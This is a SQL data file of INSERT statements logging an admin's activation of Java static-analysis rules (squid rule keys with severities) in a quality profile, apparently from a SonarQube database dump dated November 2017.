INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2765, '2017-11-20 12:19:10.469', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2068;ruleKey=squid:S2068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjQFbbGRdfPp-rIx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2766, '2017-11-20 12:19:10.528', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2077;ruleKey=squid:S2077;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjQ_bbGRdfPp-rIy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2767, '2017-11-20 12:19:10.566', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2092;ruleKey=squid:S2092;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjRmbbGRdfPp-rIz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2768, '2017-11-20 12:19:10.603', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2093;ruleKey=squid:S2093;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjSLbbGRdfPp-rI0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2769, '2017-11-20 12:19:10.639', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2094;ruleKey=squid:S2094;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjSvbbGRdfPp-rI1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2770, '2017-11-20 12:19:10.675', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2095;ruleKey=squid:S2095;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_excludedResourceTypes=;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjTTbbGRdfPp-rI2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2771, '2017-11-20 12:19:10.709', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2097;ruleKey=squid:S2097;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjT1bbGRdfPp-rI3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2772, '2017-11-20 12:19:10.733', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2109;ruleKey=squid:S2109;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjUNbbGRdfPp-rI4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2773, '2017-11-20 12:19:10.758', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2110;ruleKey=squid:S2110;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjUmbbGRdfPp-rI5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2774, '2017-11-20 12:19:10.784', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2111;ruleKey=squid:S2111;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjVAbbGRdfPp-rI6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2775, '2017-11-20 12:19:10.809', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2112;ruleKey=squid:S2112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjVZbbGRdfPp-rI7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2776, '2017-11-20 12:19:10.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2114;ruleKey=squid:S2114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjVybbGRdfPp-rI8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2777, '2017-11-20 12:19:10.867', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2116;ruleKey=squid:S2116;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjWTbbGRdfPp-rI9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2778, '2017-11-20 12:19:10.893', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2118;ruleKey=squid:S2118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjWtbbGRdfPp-rI-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2779, '2017-11-20 12:19:10.917', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2122;ruleKey=squid:S2122;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjXFbbGRdfPp-rI_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2780, '2017-11-20 12:19:10.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2123;ruleKey=squid:S2123;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjXgbbGRdfPp-rJA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2781, '2017-11-20 12:19:10.969', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2127;ruleKey=squid:S2127;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjX5bbGRdfPp-rJB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2782, '2017-11-20 12:19:11.007', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2129;ruleKey=squid:S2129;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjYfbbGRdfPp-rJC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2783, '2017-11-20 12:19:11.035', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2130;ruleKey=squid:S2130;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjY7bbGRdfPp-rJD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2784, '2017-11-20 12:19:11.06', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2131;ruleKey=squid:S2131;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjZUbbGRdfPp-rJE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2785, '2017-11-20 12:19:11.093', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2133;ruleKey=squid:S2133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjZ1bbGRdfPp-rJF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2786, '2017-11-20 12:19:11.121', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2134;ruleKey=squid:S2134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjaRbbGRdfPp-rJG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2787, '2017-11-20 12:19:11.146', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2140;ruleKey=squid:S2140;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjaqbbGRdfPp-rJH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2788, '2017-11-20 12:19:11.171', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2142;ruleKey=squid:S2142;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjbDbbGRdfPp-rJI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2789, '2017-11-20 12:19:11.197', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2147;ruleKey=squid:S2147;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjbdbbGRdfPp-rJJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2790, '2017-11-20 12:19:11.218', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2151;ruleKey=squid:S2151;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjbybbGRdfPp-rJK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2791, '2017-11-20 12:19:11.241', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2153;ruleKey=squid:S2153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjcJbbGRdfPp-rJL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2792, '2017-11-20 12:19:11.275', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2154;ruleKey=squid:S2154;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjcrbbGRdfPp-rJM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2793, '2017-11-20 12:19:11.312', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2157;ruleKey=squid:S2157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjdQbbGRdfPp-rJN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2794, '2017-11-20 12:19:11.352', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2159;ruleKey=squid:S2159;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjd4bbGRdfPp-rJO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2795, '2017-11-20 12:19:11.397', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2160;ruleKey=squid:S2160;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjelbbGRdfPp-rJP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2796, '2017-11-20 12:19:11.425', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2165;ruleKey=squid:S2165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjfBbbGRdfPp-rJQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2797, '2017-11-20 12:19:11.464', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2166;ruleKey=squid:S2166;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjfobbGRdfPp-rJR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2798, '2017-11-20 12:19:11.568', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2167;ruleKey=squid:S2167;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjhQbbGRdfPp-rJS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2799, '2017-11-20 12:19:11.633', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2168;ruleKey=squid:S2168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjiRbbGRdfPp-rJT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2800, '2017-11-20 12:19:11.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2175;ruleKey=squid:S2175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjjubbGRdfPp-rJU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2801, '2017-11-20 12:19:11.767', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2176;ruleKey=squid:S2176;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjkXbbGRdfPp-rJV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2802, '2017-11-20 12:19:11.801', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2177;ruleKey=squid:S2177;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjk5bbGRdfPp-rJW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2803, '2017-11-20 12:19:11.834', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2178;ruleKey=squid:S2178;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjlabbGRdfPp-rJX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2804, '2017-11-20 12:19:11.872', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2183;ruleKey=squid:S2183;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjmAbbGRdfPp-rJY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2805, '2017-11-20 12:19:11.908', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2184;ruleKey=squid:S2184;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjmkbbGRdfPp-rJZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2806, '2017-11-20 12:19:11.944', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2185;ruleKey=squid:S2185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjnIbbGRdfPp-rJa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2807, '2017-11-20 12:19:11.967', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2186;ruleKey=squid:S2186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjnfbbGRdfPp-rJb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2808, '2017-11-20 12:19:11.993', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2187;ruleKey=squid:S2187;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjn5bbGRdfPp-rJc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2809, '2017-11-20 12:19:12.028', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2188;ruleKey=squid:S2188;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjocbbGRdfPp-rJd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2810, '2017-11-20 12:19:12.067', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2189;ruleKey=squid:S2189;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjpDbbGRdfPp-rJe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2811, '2017-11-20 12:19:12.106', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2200;ruleKey=squid:S2200;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjpqbbGRdfPp-rJf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2812, '2017-11-20 12:19:12.132', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2201;ruleKey=squid:S2201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjqEbbGRdfPp-rJg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2813, '2017-11-20 12:19:12.158', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2204;ruleKey=squid:S2204;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjqebbGRdfPp-rJh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2814, '2017-11-20 12:19:12.189', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2209;ruleKey=squid:S2209;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjq9bbGRdfPp-rJi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2815, '2017-11-20 12:19:12.213', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2222;ruleKey=squid:S2222;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjrVbbGRdfPp-rJj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2816, '2017-11-20 12:19:12.256', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2225;ruleKey=squid:S2225;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjsAbbGRdfPp-rJk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2817, '2017-11-20 12:19:12.278', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2226;ruleKey=squid:S2226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjsWbbGRdfPp-rJl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2818, '2017-11-20 12:19:12.304', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2230;ruleKey=squid:S2230;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjswbbGRdfPp-rJm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2819, '2017-11-20 12:19:12.324', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2232;ruleKey=squid:S2232;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjtEbbGRdfPp-rJn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2820, '2017-11-20 12:19:12.342', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2235;ruleKey=squid:S2235;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjtWbbGRdfPp-rJo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2821, '2017-11-20 12:19:12.375', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2236;ruleKey=squid:S2236;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjt3bbGRdfPp-rJp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2822, '2017-11-20 12:19:12.404', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2251;ruleKey=squid:S2251;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjuUbbGRdfPp-rJq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2823, '2017-11-20 12:19:12.491', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2252;ruleKey=squid:S2252;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjvrbbGRdfPp-rJr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2824, '2017-11-20 12:19:12.55', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2254;ruleKey=squid:S2254;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjwmbbGRdfPp-rJs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2825, '2017-11-20 12:19:12.636', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2259;ruleKey=squid:S2259;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjx8bbGRdfPp-rJt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2826, '2017-11-20 12:19:12.702', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2272;ruleKey=squid:S2272;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjy-bbGRdfPp-rJu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2827, '2017-11-20 12:19:12.746', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S2273;ruleKey=squid:S2273;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXjzqbbGRdfPp-rJv');
